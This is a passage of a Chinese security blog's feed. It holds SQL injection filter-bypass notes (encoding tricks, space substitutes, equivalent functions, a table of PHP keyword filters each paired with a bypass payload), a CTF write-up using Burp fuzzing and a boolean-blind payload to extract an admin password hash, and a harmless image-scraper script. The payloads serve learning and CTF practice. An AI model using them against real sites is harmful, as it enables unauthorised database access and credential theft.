title="内联注释"></a>内联注释</h4><p>这个mysql才有的特性: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!关键字*&#x2F;</span><br></pre></td></tr></table></figure><p>上面的代码会没数据库解析执行为sql语句。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/9.png" class title="This is an test image"><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>1.URL编码<br>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT<br>2.十六进制编码<br>常用的是对参数进行十六进制编码，对一些关键字最好不用编码。<br>3.Unicode编码<br>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了看一下常用的几个符号的一些Unicode编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单引号: %u0027、%u02b9、%u02bc%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line"></span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line"></span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line"></span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>%20 %09 %0a %0b %0c %0d %a0 /**/  这些都可以替换空格。</p><p><strong>当这些字符都被过滤时，我们可以使用括号将子查询包含起来:任何可以计算出结果的语句，都可以用括号包围起来。</strong></p><h4 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin()，ord() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#39;password&#39;),1,1) &#x3D; 0x70</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x69) &#x3D; 1</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x70) &#x3D; 0</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x71) &#x3D; -1</span><br></pre></td></tr></table></figure><h4 id="特殊函数绕过"><a href="#特殊函数绕过" class="headerlink" title="特殊函数绕过"></a>特殊函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 通过greatest函数绕过不能使用大小于符号的情况</span><br><span class="line"></span><br><span class="line">greatest(a,b)，返回a和b中较大的那个数。</span><br><span class="line">当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：</span><br><span class="line">mysql&gt; select greatest(ascii(mid(user(),1,1)),150)&#x3D;150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| greatest(ascii(mid(user(),1,1)),150)&#x3D;150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">如果小于150，则上述返回值为True。</span><br><span class="line"></span><br><span class="line">2. 通过substr函数绕过不能使用逗号的情况</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line">或</span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| ascii(substr(user() from 1 for 1)) &lt; 150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line"></span><br><span class="line">3.使用数学运算函数在子查询中报错</span><br><span class="line"></span><br><span class="line">exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。</span><br><span class="line"></span><br><span class="line">~x 是一个一元运算符，将x按位取补</span><br><span class="line"></span><br><span class="line">select exp(~(select*from(select user())a))</span><br><span class="line">mysql报错：</span><br><span class="line">mysql&gt; select exp(~(select*from(select user())a));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’</span><br><span class="line"></span><br><span class="line">这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：</span><br><span class="line"></span><br><span class="line">(select*from(select user())a) 得到字符串 root@localhost</span><br><span class="line"></span><br><span class="line">表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数</span><br></pre></td></tr></table></figure><h4 id="PHP一些常见的过滤方法及绕过方式"><a href="#PHP一些常见的过滤方法及绕过方式" class="headerlink" title="PHP一些常见的过滤方法及绕过方式"></a>PHP一些常见的过滤方法及绕过方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 or 1&#x3D;1 1 and 1&#x3D;1</span><br><span class="line">绕过方式    1 || 1&#x3D;1 1 &amp;&amp; 1&#x3D;1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    union select user,password from users</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) &#x3D; 0x61 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16))&#x2F;td&gt;</span><br><span class="line">绕过方式    1 &amp;&amp; lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr, 空格</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)&#x2F;td&gt;</span><br><span class="line">绕过方式    1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;0x01-数据库特性&quot;&gt;&lt;a href=&quot;#0x01-数据库特性&quot; class=&quot;headerlink&quot; title=&quot;0x01 数据库特性&quot;&gt;&lt;/a&gt;0x01 数据库特性&lt;/h3&gt;&lt;h4 id=&quot;注释&quot;&gt;&lt;a href=&quot;#注释&quot; class=&quot;headerlink&quot; title=&quot;注释&quot;&gt;&lt;/a&gt;注释&lt;/h4&gt;&lt;p&gt;常见的注释符号：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#，--空格，-- -，--+，&amp;#x2F;&amp;#x2F;，&amp;#x2F;**&amp;#x2F;，&amp;#x2F;*任意字符串*&amp;#x2F;，;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般是使用/**/来绕过过滤空格。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select * from users where id&amp;#x3D;1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;select&amp;#x2F;**&amp;#x2F;*&amp;#x2F;**&amp;#x2F;from&amp;#x2F;**&amp;#x2F;users&amp;#x2F;*111*&amp;#x2F;where&amp;#x2F;**&amp;#x2F;id&amp;#x3D;1;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面两条语句执行结果是一样的。&lt;/p&gt;
&lt;img src=&quot;/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png&quot; class title=&quot;This is an test image&quot;&gt;
&lt;p&gt;需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。&lt;/p&gt;
&lt;img src=&quot;/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png&quot; class title=&quot;This is an test image&quot;&gt;
&lt;p&gt;这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入Fuzz记录</title>
    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html</id>
    <published>2020-02-24T14:34:23.000Z</published>
    <updated>2020-02-24T14:38:23.366Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从今天开始学习各种fuzz测试，今天做了一道sql注入题，通过fuzz来判断过滤字符，从而构造payload进行绕过。</p><hr><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拿到题目进行简单的测试</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/1.png" class title="This is an test image"><p>发现这题进行了一些sql关键字的过滤，我们通过burp的Intruder模块进行fuzz。</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/2.png" class title="This is an test image"><p>字段长度为370的是被过滤的sql语句。<br><strong>进一步分析看看这题目到底过滤了哪些关键字，通过一个个分析知道过滤了：# –+等注释符，空格，%0a,%0b等绕过过滤空格的url编码，逗号(,)，包含and和or的字符。还有很多绕过过滤的关键字，发现没有过滤sleep()，尝试一下时间盲注。</strong><br>常规的时间盲注为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(条件,sleep(3),2)</span><br></pre></td></tr></table></figure><p>但是题目过滤了逗号，想到用case when替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when 条件 then sleep(2) else 1 end</span><br></pre></td></tr></table></figure><p>但是过滤了空格等分隔符，同时内联注释 注释符 %0a %0b %0d %a0也多被过滤，我们可以用括号来代替空格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when(条件)then(sleep(2))else(1)end</span><br></pre></td></tr></table></figure><p>但是测试发现case和when中间是不能添加括号的，到这里时间盲注也是不可行的。</p><p>可以尝试另类的布尔盲注:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;admin&#39;&#x3D;&#39;admin&#39;+1 union select &#39;admin&#39;&#x3D;&#39;admin&#39;+0;</span><br></pre></td></tr></table></figure><p>在本地测试发现，第一个输出0，第二个输出1。</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/3.png" class title="This is an test image"><p>这是mysql的一个特性：<strong>在第一个查询中，先进行右边的’admin’+1操作，这个时候会强制转换admin为数字，然后相加完在和等号左边的admin比较，这个时候也会强制转换，所以就会形成不相等的情况。</strong><br>上面就可以形成布尔逻辑判断了。<br>首先我们可以先判断一些admin账号的密码长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(length(passwd)&#x3D;32)%2b&#39;</span><br></pre></td></tr></table></figure><p>%2b是+号，不能直接使用加号因为被过滤了，这里也可以使用-号，效果相同。<br>上面的逻辑是：如果passwd长度为32，则返回1，然后和admin作相加操作，这样就会形成逻辑上的差别。如下图：</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/4.png" class title="This is an test image"><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/5.png" class title="This is an test image"><p>这样就可以判断admin的密码是个32为的md5值。<br>然后在猜解每个字符，通过mid函数进行：<strong>但for被过滤！</strong><br>mid(xxx from 1)  第一位开始取剩下的所有字符<br><strong>ascii(mid(xxx from 1)) 发现截断 取第一个字符的ascii值。</strong><br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(ascii(mid((passwd)from(1)))&#x3D;48)%2b&#39;</span><br></pre></td></tr></table></figure><p>通过括号绕过空格过滤，通过mysql中的mid，ascii函数特性绕过for过滤。<br>最后通过burp爆破每一位的ascii值，就可以得到密码的md5值了。</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/6.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;从今天开始学习各
      
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>多线程爬取表情包</title>
    <link href="https://da4er.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html"/>
    <id>https://da4er.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html</id>
    <published>2020-02-23T11:01:54.000Z</published>
    <updated>2020-02-23T11:02:20.841Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>通过threading库加上queue的安全队列进行了一次对表情包网的爬出。</strong><br>代码如下：<br>使用了消费者和生产者的多线程爬虫。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">from urllib import request</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">class Producer(threading.Thread):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    def __init__ (self, page_queue,  img_queue, *args, **kwargs):</span><br><span class="line">        super(Producer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.image_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            url &#x3D; self.page_queue.get()</span><br><span class="line">            self.spider(url)</span><br><span class="line">    def spider(self, url):</span><br><span class="line">        resp &#x3D; requests.get(url, headers&#x3D;self.headers)</span><br><span class="line">        text &#x3D; resp.text</span><br><span class="line">        html &#x3D; etree.HTML(text)</span><br><span class="line">        imgs &#x3D; html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;page-content text-center&#39;]&#x2F;&#x2F;img[@class!&#x3D;&#39;gif&#39;]&quot;)</span><br><span class="line">        for i in imgs:</span><br><span class="line">            img &#x3D; i.get(&#39;data-original&#39;)</span><br><span class="line">            suffix &#x3D; os.path.splitext(img)[1]</span><br><span class="line">            alt &#x3D; i.get(&#39;alt&#39;)</span><br><span class="line">            alt &#x3D; re.sub(r&#39;[\?\.？。，,!！\*]&#39;, &#39;&#39;, alt)</span><br><span class="line">            filename &#x3D; alt + suffix</span><br><span class="line">            print(&#39;&#x2F;images&#x2F;%s&#39; %filename)</span><br><span class="line">            self.image_queue.put((img, filename))</span><br><span class="line">class Consumer(threading.Thread):</span><br><span class="line">    def __init__(self,page_queue,img_queue,*args,**kwargs):</span><br><span class="line">        super(Consumer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.img_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty() and self.img_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            img_url,filename&#x3D;self.img_queue.get()</span><br><span class="line">            request.urlretrieve(img_url,&quot;images&#x2F;&quot;+filename)</span><br><span class="line">            print(filename+&quot;  下载完成！&quot;)</span><br><span class="line">def main():</span><br><span class="line">    page_queue &#x3D; Queue(100)</span><br><span class="line">    img_queue &#x3D; Queue(1000)</span><br><span class="line">    base_url &#x3D; &quot;http:&#x2F;&#x2F;www.doutula.com&#x2F;photo&#x2F;list&#x2F;?page&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(1, 101):</span><br><span class="line">        url &#x3D; base_url.format(i)</span><br><span class="line">        page_queue.put(url)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        t&#x3D;Producer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">    for i in  range(5):</span><br><span class="line">        t&#x3D;Consumer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;通过threading库加上queue的安全队列进行了一次对表情包网的爬出。&lt;/strong&gt;&lt;br&gt;代码如下：&lt;br&gt;使用了消费者和
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>代码审计_phpmyadmin4.8.1后台文件包含漏洞(CVE-2018-12613)</title>
    <link href="https://da4er.top/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html"/>
    <id>https://da4er.top/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html</id>
    <published>2020-02-17T13:46:13.000Z</published>
    <updated>2020-02-17T13:47:27.265Z</updated>
    
